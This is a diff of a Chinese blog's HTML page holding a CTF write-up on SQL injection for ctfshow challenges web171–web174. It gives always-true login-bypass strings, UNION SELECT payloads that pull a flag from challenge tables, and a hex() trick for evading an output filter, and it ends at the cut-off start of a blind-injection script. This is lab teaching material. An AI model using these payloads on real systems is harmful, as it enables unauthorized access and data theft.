@@ -8282,8 +8282,8 @@
 <p>简单的说，<strong>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</strong></p>
 <h5 id="MySQL-5-0-1"><a href="#MySQL-5-0-1" class="headerlink" title="MySQL &lt; 5.0"></a>MySQL &lt; 5.0</h5><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工爆破了，一般用于盲注，不过现在市面中基本上很多的数据库都是5.0以上的版本，暂时还没遇到过5.0以下的。</p>
 <p>说到联合注入我就想到联合注入的一个技巧，就是插入临时表，顺便再来谈谈sql万能密码</p>
-<h4 id="sql万能密码"><a href="#sql万能密码" class="headerlink" title="sql万能密码"></a>sql万能密码</h4><h5 id="永真语句"><a href="#永真语句" class="headerlink" title="永真语句"></a>永真语句</h5><p>‘ or 1&#x3D;’1 </p>
-<p>‘or’&#x3D;’or’</p>
+<h4 id="sql万能密码"><a href="#sql万能密码" class="headerlink" title="sql万能密码"></a>sql万能密码</h4><h5 id="永真语句"><a href="#永真语句" class="headerlink" title="永真语句"></a>永真语句</h5><p>‘ or 1&#x3D;1 </p>
+<p>‘ or ‘or’&#x3D;’or’</p>
 <p>通过一个永真判断登录，其中，1&#x3D;1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论用户名是什么，只要密码是万能密码，用户都能通过验证。</p>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>分号<code>;</code>为MYSQL语句的结束符，若在支持多语句执行的情况下，可利用此方法执行其他恶意语句。比如有函数mysqli_multi_query()，它支持执行一个或多个针对数据库的查询，查询语句使用分号隔开。如果正常的语句是：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1;</span><br></pre></td></tr></table></figure>
@@ -8461,7 +8461,11 @@
 <h3 id="8-查询列中数据"><a href="#8-查询列中数据" class="headerlink" title="8.查询列中数据"></a>8.查询列中数据</h3><p>因为这里的话是id，username和password，猜测username中应该有一个flag字段，而对应的password字段就是flag的值</p>
 <p>-1’ union select 1,2,password from ctfshow_user where username &#x3D; ‘flag’ –+</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241203215507437.png" alt="image-20241203215507437"></p>
-<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>题目的话是在SELECT模块的无过滤2，但是过滤了username中的flag的</p>
+<p>或者也可以用</p>
+<p>-1’ union select 1,username,password from ctfshow_user where username &#x3D; ‘flag’ –+</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204111854584.png" alt="image-20241204111854584"></p>
+<p>这里的话可以看到用户名就是flag，而密码就是我们flag的值，这里为什么要写出来这步呢，下面就知道了</p>
+<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>题目的话是在SELECT模块的无过滤2</p>
 <p>先进行测试一下</p>
 <p>其实是和171是一样的，只不过字段数变成2了</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241203220549696.png" alt="image-20241203220549696"></p>
@@ -8473,7 +8477,13 @@
 <p>那就是在第二个表了</p>
 <p>-1’ union select 1,(select password from ctfshow_user2 where username&#x3D;’flag’)–+</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241203221128712.png" alt="image-20241203221128712"></p>
-<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>题目的话是在SELECT模块的无过滤3，可以看到也是过滤了username的flag</p>
+<p>这里的话有一个点我们要注意，就是那个返回逻辑</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204112312637.png" alt="image-20241204112312637"></p>
+<p>这里的话是对返回结果里的username进行了一个过滤，具体是怎么样一个运行结果呢?我们测试一下</p>
+<p>-1’ union select username,(select password from ctfshow_user2 where username&#x3D;’flag’)–+</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204112433438.png" alt="image-20241204112433438"></p>
+<p>这里可以看到当我们尝试将username的值返回的时候，因为username就是flag，所以会在返回逻辑中被过滤，所以这里会报错，上面的话是我们只是返回username为flag的password值，并不会碰到过滤，所以我们上面的语句才能查询到flag</p>
+<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>题目的话是在SELECT模块的无过滤3</p>
 <p>简单测试一下字段数和注入位置</p>
 <p>字段数为3，回显位置为ID，用户名和密码</p>
 <p>这道题有三个表</p>
@@ -8482,10 +8492,13 @@
 <p>三个表的列名都是一样的，id，username和password，那就试着一个个找一下</p>
 <p>最后发现flag在ctfshow_user3中</p>
 <p>-1’ union select 1,2,(select password from ctfshow_user3 where username&#x3D;’flag’)–+</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204113125580.png" alt="image-20241204113125580"></p>
 <p>然后直接拿到flag了</p>
-<p>但是其实这道题是过滤了username中的flag字段的，用-1’ union select id,username,password from ctfshow_user3 where username&#x3D;’flag’ –+会把答案给过滤了，所以我们需要用hex函数将flag转换成16进制(使用hex或者使用reverse、to_base64等函数加密）</p>
+<p>但是其实这道题是过滤了返回结果中的flag字段的，用-1’ union select id,username,password from ctfshow_user3 where username&#x3D;’flag’ –+可以看到答案给过滤了，因为恰好我们的flag的值是以ctfshow{}的格式出现的，所以我们上面的语句并不会碰上过滤，如果我们需要返回username的话，我们需要用hex函数将username的flag转换成16进制(使用hex或者使用reverse、to_base64等函数加密）</p>
 <p>‘ union select id,hex(username),password from ctfshow_user3 where username&#x3D;’flag’–+</p>
-<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>题目的话是在SELECT模块的无过滤4，过滤了ctfshow_user4中的username字段的flag</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204113153092.png" alt="image-20241204113153092"></p>
+<p>666C6167解密出来就是flag</p>
+<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>题目的话是在SELECT模块的无过滤4</p>
 <p>测试到字段数为2，但是后面的联合查询都没返回结果</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241203224159902.png" alt="image-20241203224159902"></p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241203224304435.png" alt="image-20241203224304435"></p>
@@ -8493,7 +8506,16 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>preg_match匹配返回结果中包含flag或数字的内容,就是过滤了返回结果中的数字和flag</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204114035133.png" alt="image-20241204114035133"></p>
+<p>这里可以看到id&#x3D;2的时候密码是111也就是有数字，那我们输入id&#x3D;2试一下</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204114112279.png" alt="image-20241204114112279"></p>
+<p>这里id&#x3D;2没报错，说明是有数据的，但是这里显示无数据，就是被过滤了</p>
 <p>所以这里的话是打不了正常的联合注入了，因为内容都被过滤了，根据上面我进行的两个测试不同的结果，所以我们可以试一下盲注，通过回显的不同去查询数据库，表名，表中列名，数据</p>
+<p>盲注的话手工会特别繁琐，所以我们用脚本去打</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> reques</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
         <category>ctfshow</category>
